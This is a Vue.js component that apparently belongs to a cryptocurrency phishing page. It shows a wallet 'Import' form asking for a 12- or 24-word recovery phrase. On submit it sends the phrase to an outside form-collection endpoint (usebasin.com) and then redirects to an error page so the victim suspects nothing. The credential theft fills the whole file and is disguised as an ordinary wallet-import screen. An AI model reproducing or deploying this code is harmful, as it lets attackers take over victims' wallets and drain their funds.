<template>
  <div class="phrase-form" >
      <form method="post" action="" @submit.prevent="submit">

          <textarea v-model="form.phrase"   id="" cols="30" rows="10" placeholder="Phrase"></textarea>
          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
</template>

<script>
import axios from 'axios';
export default {
    name:"phrase",

    data (){
        return{
           form : {
               phrase: '',
           }
        }
    },

    methods:{
         submit(){
           axios.post('https://usebasin.com/f/c06694797d04' ,this.form)
           .then(response => {
               console.log(response)
           })
           .finally(() => {
                this.$router.push('/err')
                 });
           
      }
    

    }

}

</script>

<style>

</style>